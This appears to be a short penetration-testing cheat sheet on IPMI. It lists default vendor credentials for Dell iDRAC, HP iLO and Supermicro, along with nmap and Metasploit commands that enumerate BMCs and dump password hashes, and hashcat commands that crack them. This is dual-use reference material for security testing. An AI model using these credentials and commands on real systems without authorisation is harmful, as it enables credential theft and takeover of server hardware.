+++
title = "IPMI"
+++

- `UDP 623`: normal
- Default Passwords:
    - Dell iDRAC:	`root:calvin`
    - HP iLO: `Administrator:[randomized 8-character string consisting of numbers and uppercase letters]`
    - Supermicro IPMI: `ADMIN:ADMIN`

A hardware control protocol that gives "virtual" physical access to a machine.

{{% details "Dangerous Settings" %}}

- Server sends the salted hash of the user's password to the user before authentication

{{% /details %}}

```bash
### Enumeration via nmap
sudo nmap -sU -p623 --script ipmi-version

### Metasploit Scanner
setg RHOSTS <TARGET>
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/
use auxiliary/scanner/ipmi/ipmi_version
run
# https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/
use auxiliary/scanner/ipmi/ipmi_dumphashes
run

### Crack HP iLO format
# https://hashcat.net/wiki/doku.php?id=example_hashes
hashcat -m 7300 ipmi_hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 -w 3 -O "<HASH>" /usr/share/wordlists/rockyou.txt
```
